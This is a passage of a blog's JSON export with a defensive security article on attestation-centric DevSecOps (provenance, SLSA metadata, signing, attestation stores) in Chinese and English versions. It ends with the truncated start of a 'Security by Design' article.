认证和区块链：相似的原则将认证想象成区块链技术——两者都创建不可变的记录链。在区块链中，每个区块包含前一个区块的加密哈希，使其防篡改。同样，认证为您的软件创建加密的监管链： 不可变性：一旦签署，认证无法在不被检测的情况下更改 透明度：任何有访问权限的人都可以验证监管链 去中心化：没有单点故障或信任 加密证明：数学确定性而不是基于信任的验证 然而，与区块链不同，认证不需要分布式共识或挖矿——它们轻量、快速，专门为软件供应链安全设计。 sequenceDiagram participant Dev as 开发者 participant Repo as 代码仓库 participant Build as 构建系统 participant Sign as 签署服务 participant Store as 认证存储 participant Verify as 验证器 Dev->>Repo: 提交代码 Repo->>Build: 触发构建 Build->>Build: 收集元数据 Build->>Sign: 请求签署 Sign->>Sign: 生成加密签名 Sign->>Store: 存储签署认证 Store->>Verify: 提供认证 Verify->>Verify: 验证签名 Verify->>Verify: ✓ 认证有效 认证和元数据的概念在业界已经存在了几十年，但直到最近我们才开始看到更多工具和服务出现来支持这一点。例如，GitHub 最近推出了工件认证的公开测试版。 认证如何拯救局面 以认证为中心的 DevSecOps 将分散的工具环境转变为统一、可验证的生态系统。认证不是强制工具直接相互集成，而是创建所有工具都可以使用的通用语言。 用共享证据打破孤岛 想象 Sarah，一家大型金融机构的安全工程师。她的团队使用 Snyk 进行漏洞扫描，而移动团队偏好 Checkmarx，基础设施团队依赖 Prisma Cloud。以前，关联这些团队的安全发现需要手动工作，通常导致覆盖范围的差距。 使用以认证为中心的 DevSecOps，每个工具都会生成关于其发现的加密签署认证。当 Sarah 需要评估使用共享基础设施组件的移动应用程序的安全态势时，她可以通过认证追踪完整的安全旅程： graph TB A[代码提交] -->|代码认证| B[来源已验证] B -->|构建认证| C[构建已验证] C -->|扫描认证| D[安全已扫描] D -->|部署认证| E[已部署] B -.->|作者身份代码完整性| Info1[\" \"] C -.->|构建环境构建流程| Info2[\" \"] D -.->|Snyk 发现Checkmarx 结果Prisma Cloud 报告| Info3[\" \"] E -.->|环境配置部署时间| Info4[\" \"] style A fill:#4dabf7,stroke:#1971c2 style B fill:#51cf66,stroke:#2f9e44 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 style Info1 fill:none,stroke:none style Info2 fill:none,stroke:none style Info3 fill:none,stroke:none style Info4 fill:none,stroke:none ✅ 实际运作的认证类型 代码认证：确认源代码完整性和作者身份 构建认证：验证构建环境和流程 扫描认证：记录来自多个工具的安全发现 部署认证：记录部署环境和配置 供应链透明度变得简单 从 SolarWinds 到 Log4j 的供应链攻击激增，使企业敏锐地意识到他们的盲点。传统方法通常依赖软件物料清单（SBOM），但这些是静态快照，无法捕捉现代软件开发的动态性质。 以认证为中心的方法提供了活生生的审计追踪。当在第三方库中发现新漏洞时，安全团队可以通过查询认证快速识别所有受影响的应用程序，而不是手动检查每个项目的依赖项。 实际实施：三大支柱 graph TB subgraph \"支柱 1：标准化元数据\" Tools[DevSecOps 工具] -->|生成| Meta[标准化认证] end subgraph \"支柱 2：加密验证\" Meta -->|签署| Crypto[加密签署] end subgraph \"支柱 3：可查询存储\" Crypto -->|存储| Store[认证存储] Store -->|查询| Q1[\"谁构建了这个？\"] Store -->|查询| Q2[\"有什么漏洞？\"] Store -->|查询| Q3[\"执行了哪些扫描？\"] end style Meta fill:#4dabf7,stroke:#1971c2 style Crypto fill:#51cf66,stroke:#2f9e44 style Store fill:#ffd43b,stroke:#fab005 style Q1 fill:#e7f5ff,stroke:#1971c2 style Q2 fill:#e7f5ff,stroke:#1971c2 style Q3 fill:#e7f5ff,stroke:#1971c2 🏛️ 支柱 1：标准化元数据收集DevSecOps 管道中的每个工具都应该以标准化格式生成认证。这并不意味着替换现有工具——而是用认证能力增强它们。 标准化确保所有工具使用相同的语言，使集成无缝并降低管理多个安全工具的复杂性。 📄 认证元数据示例这个 YAML 结构遵循 SLSA（软件工件供应链等级）来源格式，正在成为业界标准。它捕捉： 主体：正在认证的工件（名称和加密摘要） 谓词类型：正在使用的认证格式 构建者信息：谁/什么创建了工件 来源信息：代码来自哪里 # 认证元数据示例 subject: name: &quot;myapp:v1.2.3&quot; digest: &quot;sha256:abc123...&quot; predicateType: &quot;https:&#x2F;&#x2F;slsa.dev&#x2F;provenance&#x2F;v0.2&quot; predicate: builder: id: &quot;https:&#x2F;&#x2F;github.com&#x2F;actions&quot; buildType: &quot;https:&#x2F;&#x2F;github.com&#x2F;actions&#x2F;workflow&quot; invocation: configSource: uri: &quot;git+https:&#x2F;&#x2F;github.com&#x2F;myorg&#x2F;myapp&quot; digest: &quot;sha1:def456...&quot; 🔒 支柱 2：加密验证所有认证都必须加密签署以确保完整性和不可否认性。这创建了一个不可变的监管链，可以抵御复杂的攻击。 将其视为数字印章，证明： 认证没有被篡改 它来自受信任的来源 它在特定时间点创建 🔍 支柱 3：可查询认证存储认证数据应该存储在集中的、可查询的系统中，允许安全团队提出复杂的问题，例如： &quot;显示过去 30 天内由外部贡献者提交的代码构建的所有应用程序&quot; &quot;哪些部署包含库 X 的易受攻击版本？&quot; &quot;在生产部署之前对此工件执行了哪些安全扫描？&quot; 这将安全性从被动转变为主动——您可以在事件发生之前回答问题。 前进之路：从小处着手，大处着眼 🚀 实施路线图实施以认证为中心的 DevSecOps 不需要完全改造现有基础设施。从这些实际步骤开始： 从构建认证试点开始：首先为最关键的应用程序生成构建来源认证 逐步集成：一次一个地为现有安全工具添加认证能力 建立政策：定义不同类型部署所需的认证 培训团队：确保开发者和安全工程师了解如何解释和使用认证数据 graph LR A[第 1-2 周试点构建认证] --> B[第 3-4 周添加安全扫描认证] B --> C[第 5-6 周集成部署认证] C --> D[第 7-8 周建立政策] D --> E[持续培训与改进] style A fill:#4dabf7,stroke:#1971c2 style B fill:#4dabf7,stroke:#1971c2 style C fill:#4dabf7,stroke:#1971c2 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 结论：通过透明度建立信任 在软件供应链持续受到威胁且企业开发团队在日益复杂的环境中运作的时代，以认证为中心的 DevSecOps 提供了通往安全和运营效率的道路。通过为软件开发生命周期的每个步骤创建可验证的加密证据，组织可以从希望其安全措施有效转变为知道它们有效。 企业软件安全的未来不是拥有更多工具——而是更好地了解这些工具如何协同工作以保护您的组织。以认证为中心的 DevSecOps 提供了这种可见性，一次一个加密签名。 准备为您的组织探索以认证为中心的 DevSecOps？首先评估您当前的工具环境，并识别为最关键的开发管道添加认证能力的机会。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[],"lang":"zh-CN"},{"title":"以認證為中心的 DevSecOps - 強化企業軟體開發","slug":"2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development-zh-TW","date":"un66fin66","updated":"un66fin66","comments":false,"path":"/zh-TW/2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development/","permalink":"https://neo01.com/zh-TW/2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development/","excerpt":"供應鏈攻擊激增,團隊孤島作戰,工具分散——探索以認證為中心的DevSecOps如何統一企業安全實踐。","text":"企業內部對於能夠將軟體工件追溯回其原始原始碼和建置指令的可靠方法的需求日益增長，這是由供應鏈攻擊的增加所驅動的。這種需求也適用於其他常見的企業情境，例如孤立的團隊合作和 DevSecOps 實踐的多樣化。雖然企業通常可以使用市場上廣泛的 DevSecOps 工具，但他們採用的工具越多，他們的流程往往變得越分散和孤立。 工具困境：整合過載 一旦企業配備了廣泛的 DevSecOps 工具陣列，下一個挑戰就是整合它們以最小化分散。市場提供了眾多工具，每個都聲稱是安全挑戰的終極解決方案。然而，實際上，沒有單一工具可以全面解決所有問題。關鍵挑戰是建立一個凝聚的生態系統，讓這些工具和諧運作，確保軟體交付的透明和高效管道。 graph TB subgraph Frag[\"傳統分散方法\"] Code1[程式碼儲存庫] --> Tool1[Snyk] Code1 --> Tool2[Checkmarx] Code1 --> Tool3[Prisma Cloud] Tool1 -.x|手動整合|.-> Portal1[開發者入口] Tool2 -.x|手動整合|.-> Portal1 Tool3 -.x|手動整合|.-> Portal1 Portal1 -.x|分散資料|.-> Team1[安全團隊] end Frag -.->|轉型| Unified subgraph Unified[\"認證統一方法\"] Code2[程式碼儲存庫] --> Att1[Snyk + 認證] Code2 --> Att2[Checkmarx + 認證] Code2 --> Att3[Prisma Cloud + 認證] Att1 -->|簽署認證| Store[認證儲存] Att2 -->|簽署認證| Store Att3 -->|簽署認證| Store Store -->|統一視圖| Team2[安全團隊] end style Tool1 fill:#ff6b6b,stroke:#c92a2a style Tool2 fill:#ff6b6b,stroke:#c92a2a style Tool3 fill:#ff6b6b,stroke:#c92a2a style Portal1 fill:#ffd43b,stroke:#fab005 style Att1 fill:#51cf66,stroke:#2f9e44 style Att2 fill:#51cf66,stroke:#2f9e44 style Att3 fill:#51cf66,stroke:#2f9e44 style Store fill:#4dabf7,stroke:#1971c2 許多企業選擇開發自己的開發者入口，整合或使用這些工具的掃描報告，並為開發者和安全工程師提供統一視圖。這種方法允許集中管理漏洞、合規性檢查和其他安全相關任務。然而，它需要大量投資於開發和維護。如果沒有適當的整合和無縫的工作流程，這些工具可能成為開發團隊的噩夢。此外，不同的開發團隊通常對其軟體開發生命週期（SDLC）有不同的工具；例如，行動開發團隊可能使用專門的掃描工具。 什麼是認證？ 🔐 理解認證認證是一組工具和實踐，使 SDLC 中的每個步驟都能在軟體工件和產生它們的流程之間建立安全且可驗證的連結。這些認證作為防篡改、不可偽造的紙本追蹤，詳細記錄軟體創建過程的每個步驟，從程式碼提交到建置和部署。 認證流程 讓我們通過將其分解為易於理解的步驟來探索認證的工作原理： 步驟 1：元資料收集 創建工件認證的過程通常涉及產生加密簽署的聲明，證明軟體建置的來源。這包括以下資訊： 與工件相關的工作流程 儲存庫和組織 環境詳細資訊 提交 SHA 建置的觸發事件 我們將這些資訊稱為元資料。 步驟 2：加密簽署 然後將元資料打包成加密簽署的工件認證，可以儲存在受信任的儲存庫中或分發給軟體的消費者。這個過程確保軟體建置及其相關元資料的來源是可驗證和防篡改的。 步驟 3：驗證 任何人都可以使用公鑰驗證認證，確保工件沒有被篡改並來自受信任的來源。 區塊鏈連結 🔗 認證和區塊鏈：相似的原則將認證想像成區塊鏈技術——兩者都創建不可變的記錄鏈。在區塊鏈中，每個區塊包含前一個區塊的加密雜湊，使其防篡改。同樣，認證為您的軟體創建加密的監管鏈： 不可變性：一旦簽署，認證無法在不被檢測的情況下更改 透明度：任何有訪問權限的人都可以驗證監管鏈 去中心化：沒有單點故障或信任 加密證明：數學確定性而不是基於信任的驗證 然而，與區塊鏈不同，認證不需要分散式共識或挖礦——它們輕量、快速，專門為軟體供應鏈安全設計。 sequenceDiagram participant Dev as 開發者 participant Repo as 程式碼儲存庫 participant Build as 建置系統 participant Sign as 簽署服務 participant Store as 認證儲存 participant Verify as 驗證器 Dev->>Repo: 提交程式碼 Repo->>Build: 觸發建置 Build->>Build: 收集元資料 Build->>Sign: 請求簽署 Sign->>Sign: 產生加密簽章 Sign->>Store: 儲存簽署認證 Store->>Verify: 提供認證 Verify->>Verify: 驗證簽章 Verify->>Verify: ✓ 認證有效 認證和元資料的概念在業界已經存在了幾十年，但直到最近我們才開始看到更多工具和服務出現來支援這一點。例如，GitHub 最近推出了工件認證的公開測試版。 認證如何拯救局面 以認證為中心的 DevSecOps 將分散的工具環境轉變為統一、可驗證的生態系統。認證不是強制工具直接相互整合，而是創建所有工具都可以使用的通用語言。 用共享證據打破孤島 想像 Sarah，一家大型金融機構的安全工程師。她的團隊使用 Snyk 進行漏洞掃描，而行動團隊偏好 Checkmarx，基礎設施團隊依賴 Prisma Cloud。以前，關聯這些團隊的安全發現需要手動工作，通常導致覆蓋範圍的差距。 使用以認證為中心的 DevSecOps，每個工具都會產生關於其發現的加密簽署認證。當 Sarah 需要評估使用共享基礎設施元件的行動應用程式的安全態勢時，她可以通過認證追蹤完整的安全旅程： graph TB A[程式碼提交] -->|程式碼認證| B[來源已驗證] B -->|建置認證| C[建置已驗證] C -->|掃描認證| D[安全已掃描] D -->|部署認證| E[已部署] B -.->|作者身份程式碼完整性| Info1[\" \"] C -.->|建置環境建置流程| Info2[\" \"] D -.->|Snyk 發現Checkmarx 結果Prisma Cloud 報告| Info3[\" \"] E -.->|環境配置部署時間| Info4[\" \"] style A fill:#4dabf7,stroke:#1971c2 style B fill:#51cf66,stroke:#2f9e44 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 style Info1 fill:none,stroke:none style Info2 fill:none,stroke:none style Info3 fill:none,stroke:none style Info4 fill:none,stroke:none ✅ 實際運作的認證類型 程式碼認證：確認原始碼完整性和作者身份 建置認證：驗證建置環境和流程 掃描認證：記錄來自多個工具的安全發現 部署認證：記錄部署環境和配置 供應鏈透明度變得簡單 從 SolarWinds 到 Log4j 的供應鏈攻擊激增，使企業敏銳地意識到他們的盲點。傳統方法通常依賴軟體物料清單（SBOM），但這些是靜態快照，無法捕捉現代軟體開發的動態性質。 以認證為中心的方法提供了活生生的審計追蹤。當在第三方函式庫中發現新漏洞時，安全團隊可以通過查詢認證快速識別所有受影響的應用程式，而不是手動檢查每個專案的依賴項。 實際實施：三大支柱 graph TB subgraph \"支柱 1：標準化元資料\" Tools[DevSecOps 工具] -->|產生| Meta[標準化認證] end subgraph \"支柱 2：加密驗證\" Meta -->|簽署| Crypto[加密簽署] end subgraph \"支柱 3：可查詢儲存\" Crypto -->|儲存| Store[認證儲存] Store -->|查詢| Q1[\"誰建置了這個？\"] Store -->|查詢| Q2[\"有什麼漏洞？\"] Store -->|查詢| Q3[\"執行了哪些掃描？\"] end style Meta fill:#4dabf7,stroke:#1971c2 style Crypto fill:#51cf66,stroke:#2f9e44 style Store fill:#ffd43b,stroke:#fab005 style Q1 fill:#e7f5ff,stroke:#1971c2 style Q2 fill:#e7f5ff,stroke:#1971c2 style Q3 fill:#e7f5ff,stroke:#1971c2 🏛️ 支柱 1：標準化元資料收集DevSecOps 管道中的每個工具都應該以標準化格式產生認證。這並不意味著替換現有工具——而是用認證能力增強它們。 標準化確保所有工具使用相同的語言，使整合無縫並降低管理多個安全工具的複雜性。 📄 認證元資料範例這個 YAML 結構遵循 SLSA（軟體工件供應鏈等級）來源格式，正在成為業界標準。它捕捉： 主體：正在認證的工件（名稱和加密摘要） 謂詞類型：正在使用的認證格式 建置者資訊：誰/什麼創建了工件 來源資訊：程式碼來自哪裡 # 認證元資料範例 subject: name: &quot;myapp:v1.2.3&quot; digest: &quot;sha256:abc123...&quot; predicateType: &quot;https:&#x2F;&#x2F;slsa.dev&#x2F;provenance&#x2F;v0.2&quot; predicate: builder: id: &quot;https:&#x2F;&#x2F;github.com&#x2F;actions&quot; buildType: &quot;https:&#x2F;&#x2F;github.com&#x2F;actions&#x2F;workflow&quot; invocation: configSource: uri: &quot;git+https:&#x2F;&#x2F;github.com&#x2F;myorg&#x2F;myapp&quot; digest: &quot;sha1:def456...&quot; 🔒 支柱 2：加密驗證所有認證都必須加密簽署以確保完整性和不可否認性。這創建了一個不可變的監管鏈，可以抵禦複雜的攻擊。 將其視為數位印章，證明： 認證沒有被篡改 它來自受信任的來源 它在特定時間點創建 🔍 支柱 3：可查詢認證儲存認證資料應該儲存在集中的、可查詢的系統中，允許安全團隊提出複雜的問題，例如： 「顯示過去 30 天內由外部貢獻者提交的程式碼建置的所有應用程式」 「哪些部署包含函式庫 X 的易受攻擊版本？」 「在生產部署之前對此工件執行了哪些安全掃描？」 這將安全性從被動轉變為主動——您可以在事件發生之前回答問題。 前進之路：從小處著手，大處著眼 🚀 實施路線圖實施以認證為中心的 DevSecOps 不需要完全改造現有基礎設施。從這些實際步驟開始： 從建置認證試點開始：首先為最關鍵的應用程式產生建置來源認證 逐步整合：一次一個地為現有安全工具添加認證能力 建立政策：定義不同類型部署所需的認證 培訓團隊：確保開發者和安全工程師了解如何解釋和使用認證資料 graph LR A[第 1-2 週試點建置認證] --> B[第 3-4 週添加安全掃描認證] B --> C[第 5-6 週整合部署認證] C --> D[第 7-8 週建立政策] D --> E[持續培訓與改進] style A fill:#4dabf7,stroke:#1971c2 style B fill:#4dabf7,stroke:#1971c2 style C fill:#4dabf7,stroke:#1971c2 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 結論：通過透明度建立信任 在軟體供應鏈持續受到威脅且企業開發團隊在日益複雜的環境中運作的時代，以認證為中心的 DevSecOps 提供了通往安全和營運效率的道路。通過為軟體開發生命週期的每個步驟創建可驗證的加密證據，組織可以從希望其安全措施有效轉變為知道它們有效。 企業軟體安全的未來不是擁有更多工具——而是更好地了解這些工具如何協同工作以保護您的組織。以認證為中心的 DevSecOps 提供了這種可見性，一次一個加密簽章。 準備為您的組織探索以認證為中心的 DevSecOps？首先評估您當前的工具環境，並識別為最關鍵的開發管道添加認證能力的機會。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[],"lang":"zh-TW"},{"title":"Attestation-Centric DevSecOps - Fortifying Enterprise Software Development","slug":"2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development","date":"un66fin66","updated":"un66fin66","comments":false,"path":"2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development/","permalink":"https://neo01.com/2024/11/Attestation-Centric-Dev-Sec-Ops-Fortifying-Enterprise-Software-Development/","excerpt":"Supply chain attacks surge, teams work in silos, tools fragment—discover how attestation-centric DevSecOps unifies enterprise security with cryptographic proof.","text":"There is a growing demand within enterprises for a reliable method to trace software artifacts back to their original source code and build instructions, driven by the rise in supply chain attacks. This need also applies to other common enterprise scenarios, such as siloed teamwork and the diversification of DevSecOps practices. While enterprises often have access to a broad range of DevSecOps tools on the market, the more tools they adopt, the more fragmented and isolated their processes tend to become. The Tooling Conundrum: Integration Overload Once an enterprise has equipped itself with a wide array of DevSecOps tools, the next challenge is integrating them to minimize fragmentation. The market offers numerous tools, each claiming to be the ultimate solution for security challenges. However, in reality, no single tool can address all issues comprehensively. The key challenge is to build a cohesive ecosystem where these tools operate in harmony, ensuring a transparent and efficient pipeline for software delivery. graph TB subgraph Frag[\"Traditional Fragmented Approach\"] Code1[Code Repository] --> Tool1[Snyk] Code1 --> Tool2[Checkmarx] Code1 --> Tool3[Prisma Cloud] Tool1 -.x|Manual Integration|.-> Portal1[Developer Portal] Tool2 -.x|Manual Integration|.-> Portal1 Tool3 -.x|Manual Integration|.-> Portal1 Portal1 -.x|Fragmented Data|.-> Team1[Security Team] end Frag -.->|Transform| Unified subgraph Unified[\"Attestation-Unified Approach\"] Code2[Code Repository] --> Att1[Snyk + Attestation] Code2 --> Att2[Checkmarx + Attestation] Code2 --> Att3[Prisma Cloud + Attestation] Att1 -->|Signed Attestation| Store[Attestation Store] Att2 -->|Signed Attestation| Store Att3 -->|Signed Attestation| Store Store -->|Unified View| Team2[Security Team] end style Tool1 fill:#ff6b6b,stroke:#c92a2a style Tool2 fill:#ff6b6b,stroke:#c92a2a style Tool3 fill:#ff6b6b,stroke:#c92a2a style Portal1 fill:#ffd43b,stroke:#fab005 style Att1 fill:#51cf66,stroke:#2f9e44 style Att2 fill:#51cf66,stroke:#2f9e44 style Att3 fill:#51cf66,stroke:#2f9e44 style Store fill:#4dabf7,stroke:#1971c2 Many enterprises choose to develop their own developer portals that integrate or consume scanning reports from these tools and provide a unified view for developers and security engineers. This approach allows for centralized management of vulnerabilities, compliance checks, and other security-related tasks. However, it requires significant investment in development and maintenance. Without proper integration and a seamless workflow, these tools can become a nightmare for development teams. Additionally, different development teams often have distinct tooling for their Software Development Life Cycle (SDLC); for example, mobile development teams may use specialized scanning tools. What is Attestation? 🔐 Understanding AttestationAttestations are a set of tools and practices that enable every step in the SDLC to create a secure and verifiable link between software artifacts and the processes that produced them. These attestations serve as a tamper-proof, unforgeable paper trail that details every step of the software creation process, from code commits to build and deployment. The Attestation Process Let’s explore how attestation works by breaking it down into digestible steps: Step 1: Metadata Collection The process of creating an Artifact Attestation typically involves generating cryptographically signed claims that certify the provenance of a software build. This includes information such as: The workflow associated with the artifact The repository and organization Environment details Commit SHA The triggering event for the build We refer to this information as metadata. Step 2: Cryptographic Signing The metadata is then packaged into a cryptographically signed artifact attestation, which can be stored in a trusted repository or distributed to consumers of the software. This process ensures that the provenance of the software build and its associated metadata are verifiable and tamper-proof. Step 3: Verification Anyone can verify the attestation using the public key, ensuring the artifact hasn’t been tampered with and came from a trusted source. The Blockchain Connection 🔗 Attestation and Blockchain: Similar PrinciplesThink of attestations like blockchain technology—both create an immutable chain of records. In blockchain, each block contains a cryptographic hash of the previous block, making it tamper-evident. Similarly, attestations create a cryptographic chain of custody for your software: Immutability: Once signed, attestations cannot be altered without detection Transparency: Anyone with access can verify the chain of custody Decentralization: No single point of failure or trust Cryptographic Proof: Mathematical certainty rather than trust-based verification However, unlike blockchain, attestations don't require distributed consensus or mining—they're lightweight, fast, and designed specifically for software supply chain security. sequenceDiagram participant Dev as Developer participant Repo as Code Repository participant Build as Build System participant Sign as Signing Service participant Store as Attestation Store participant Verify as Verifier Dev->>Repo: Commit Code Repo->>Build: Trigger Build Build->>Build: Collect Metadata Build->>Sign: Request Signature Sign->>Sign: Generate Cryptographic Signature Sign->>Store: Store Signed Attestation Store->>Verify: Provide Attestation Verify->>Verify: Verify Signature Verify->>Verify: ✓ Attestation Valid The concept of attestation and metadata has been present in the industry for decades, but it is only recently that we have started seeing more tools and services emerging to support this. GitHub, for instance, has recently launched a public beta for artifact attestations. How Attestation Comes to the Rescue Attestation-centric DevSecOps transforms the fragmented tooling landscape into a unified, verifiable ecosystem. Instead of forcing tools to integrate directly with each other, attestations create a common language that all tools can speak. Breaking Down Silos with Shared Evidence Imagine Sarah, a security engineer at a large financial institution. Her team uses Snyk for vulnerability scanning, while the mobile team prefers Checkmarx, and the infrastructure team relies on Prisma Cloud. Previously, correlating security findings across these teams required manual effort and often led to gaps in coverage. With attestation-centric DevSecOps, each tool generates cryptographically signed attestations about its findings. When Sarah needs to assess the security posture of a mobile application that uses shared infrastructure components, she can trace the complete security journey through attestations: graph TB A[Code Commit] -->|Code Attestation| B[Source Verified] B -->|Build Attestation| C[Build Verified] C -->|Scan Attestation| D[Security Scanned] D -->|Deployment Attestation| E[Deployed] B -.->|Author IdentityCode Integrity| Info1[\" \"] C -.->|Build EnvironmentBuild Process| Info2[\" \"] D -.->|Snyk FindingsCheckmarx ResultsPrisma Cloud Report| Info3[\" \"] E -.->|Environment ConfigDeployment Time| Info4[\" \"] style A fill:#4dabf7,stroke:#1971c2 style B fill:#51cf66,stroke:#2f9e44 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 style Info1 fill:none,stroke:none style Info2 fill:none,stroke:none style Info3 fill:none,stroke:none style Info4 fill:none,stroke:none ✅ Attestation Types in Action Code Attestation: Confirms the source code integrity and author identity Build Attestation: Verifies the build environment and process Scan Attestation: Documents security findings from multiple tools Deployment Attestation: Records the deployment environment and configuration Supply Chain Transparency Made Simple The recent surge in supply chain attacks, from SolarWinds to Log4j, has made enterprises acutely aware of their blind spots. Traditional approaches often rely on Software Bills of Materials (SBOMs), but these are static snapshots that don’t capture the dynamic nature of modern software development. Attestation-centric approaches provide a living audit trail. When a new vulnerability is discovered in a third-party library, security teams can quickly identify all affected applications by querying attestations rather than manually checking each project’s dependencies. Real-World Implementation: The Three Pillars graph TB subgraph \"Pillar 1: Standardized Metadata\" Tools[DevSecOps Tools] -->|Generate| Meta[Standardized Attestations] end subgraph \"Pillar 2: Cryptographic Verification\" Meta -->|Sign| Crypto[Cryptographically Signed] end subgraph \"Pillar 3: Queryable Store\" Crypto -->|Store| Store[Attestation Store] Store -->|Query| Q1[\"Who built this?\"] Store -->|Query| Q2[\"What vulnerabilities?\"] Store -->|Query| Q3[\"Which scans ran?\"] end style Meta fill:#4dabf7,stroke:#1971c2 style Crypto fill:#51cf66,stroke:#2f9e44 style Store fill:#ffd43b,stroke:#fab005 style Q1 fill:#e7f5ff,stroke:#1971c2 style Q2 fill:#e7f5ff,stroke:#1971c2 style Q3 fill:#e7f5ff,stroke:#1971c2 🏛️ Pillar 1: Standardized Metadata CollectionEvery tool in your DevSecOps pipeline should generate attestations in a standardized format. This doesn't mean replacing your existing tools—it means augmenting them with attestation capabilities. The standardization ensures that all tools speak the same language, making integration seamless and reducing the complexity of managing multiple security tools. 📄 Example Attestation MetadataThis YAML structure follows the SLSA (Supply chain Levels for Software Artifacts) provenance format, which is becoming an industry standard. It captures: Subject: What artifact is being attested (name and cryptographic digest) Predicate Type: The attestation format being used Builder Information: Who/what created the artifact Source Information: Where the code came from # Example attestation metadata subject: name: &quot;myapp:v1.2.3&quot; digest: &quot;sha256:abc123...&quot; predicateType: &quot;https:&#x2F;&#x2F;slsa.dev&#x2F;provenance&#x2F;v0.2&quot; predicate: builder: id: &quot;https:&#x2F;&#x2F;github.com&#x2F;actions&quot; buildType: &quot;https:&#x2F;&#x2F;github.com&#x2F;actions&#x2F;workflow&quot; invocation: configSource: uri: &quot;git+https:&#x2F;&#x2F;github.com&#x2F;myorg&#x2F;myapp&quot; digest: &quot;sha1:def456...&quot; 🔒 Pillar 2: Cryptographic VerificationAll attestations must be cryptographically signed to ensure integrity and non-repudiation. This creates an immutable chain of custody that can withstand sophisticated attacks. Think of it as a digital seal that proves: The attestation hasn't been tampered with It came from a trusted source It was created at a specific point in time 🔍 Pillar 3: Queryable Attestation StoreAttestation data should be stored in a centralized, queryable system that allows security teams to ask complex questions like: &quot;Show me all applications built from code committed by external contributors in the last 30 days&quot; &quot;Which deployments contain the vulnerable version of library X?&quot; &quot;What security scans were performed on this artifact before production deployment?&quot; This transforms security from reactive to proactive—you can answer questions before incidents occur. The Path Forward: Starting Small, Thinking Big 🚀 Implementation RoadmapImplementing attestation-centric DevSecOps doesn't require a complete overhaul of your existing infrastructure. Start with these practical steps: Pilot with Build Attestations: Begin by generating build provenance attestations for your most critical applications Integrate Gradually: Add attestation capabilities to your existing security tools one at a time Establish Policies: Define what attestations are required for different types of deployments Train Your Teams: Ensure developers and security engineers understand how to interpret and use attestation data graph LR A[Week 1-2Pilot BuildAttestations] --> B[Week 3-4Add SecurityScan Attestations] B --> C[Week 5-6IntegrateDeployment Attestations] C --> D[Week 7-8EstablishPolicies] D --> E[OngoingTrain & Refine] style A fill:#4dabf7,stroke:#1971c2 style B fill:#4dabf7,stroke:#1971c2 style C fill:#4dabf7,stroke:#1971c2 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 Conclusion: Trust Through Transparency In an era where software supply chains are under constant threat and enterprise development teams operate in increasingly complex environments, attestation-centric DevSecOps offers a path to both security and operational efficiency. By creating verifiable, cryptographic evidence of every step in the software development lifecycle, organizations can move from a position of hoping their security measures are effective to knowing they are. The future of enterprise software security isn’t about having more tools—it’s about having better visibility into how those tools work together to protect your organization. Attestation-centric DevSecOps provides that visibility, one cryptographic signature at a time. Ready to explore attestation-centric DevSecOps for your organization? Start by evaluating your current tooling landscape and identifying opportunities to add attestation capabilities to your most critical development pipelines.","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[]},{"title":"Security by Design - The Architectural Blueprint for Cybersecurity","slug":"2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity/","permalink":"https://neo01.com/2024/10/Security_by_design_the_architectural_blueprint_for_cybersecurity/","excerpt":"Security by design isn't an afterthought. Discover how threat modeling, automation, and risk-based approaches embed security into your system's DNA from day one.","text":"What is Security by Design? In the digital age, where cyber threats loom large, “Security by Design” has emerged as the architectural blueprint for building robust cybersecurity defenses into the very fabric of software and systems. It is a proactive approach that integrates security measures from the ground up, rather than as an afterthought. This concept is akin to constructing a building with a strong foundation and integrated security systems, rather than adding locks and alarms after the building is complete. Security by Design is not merely about adding layers of protection; it’s about embedding security into the DNA of the system. It contrasts sharply with practices that treat security as a peripheral or secondary feature, which can be likened to bolting a steel door onto a straw house – the door may be secure, but the overall structure remains vulnerable. What is NOT Security by Design? Understanding what Security by Design is not helps clarify its true nature: Bolt-On Security: Adding security features after development is complete is not Security by Design. This reactive approach is like installing a security system in a house with unlocked windows – you’re addressing symptoms rather than root causes. Compliance-Only Mindset: Meeting minimum regulatory requirements without considering actual threats is not Security by Design. It’s like building to code minimums rather than engineering for real-world conditions. Security Through Obscurity: Relying on keeping system details secret rather than building inherently secure systems is not Security by Design. This is akin to hiding your house key under the doormat – it only works until someone knows where to look. Perimeter-Only Defense: Focusing solely on external defenses while ignoring internal security is not Security by Design. Modern threats require defense in depth, not just a strong outer wall. graph LR A(Security by Design) -->|Proactive| B(Built-in from Start) A -->|Holistic| C(Every Layer Protected) A -->|Threat-Aware| D(Based on Real Risks) E(NOT Security by Design) -->|Reactive| F(Added After) E -->|Superficial| G(Perimeter Only) E -->|Compliance-Driven| H(Checkbox Security) style A fill:#90EE90 style E fill:#FFB6C6 Comparatively, “Security by Default” is the principle that out-of-the-box settings should be the most secure possible. Imagine buying a smartphone that, by default, has all the necessary privacy settings enabled, as opposed to one that requires you to manually adjust these settings to secure your data. Threat modeling, control validation, automation, and security principles are fundamental components of the Security by Design approach, each playing a crucial role in fortifying the security posture of an organization’s digital infrastructure. Threat Modeling: This is the process of proactively identifying and understanding potential security 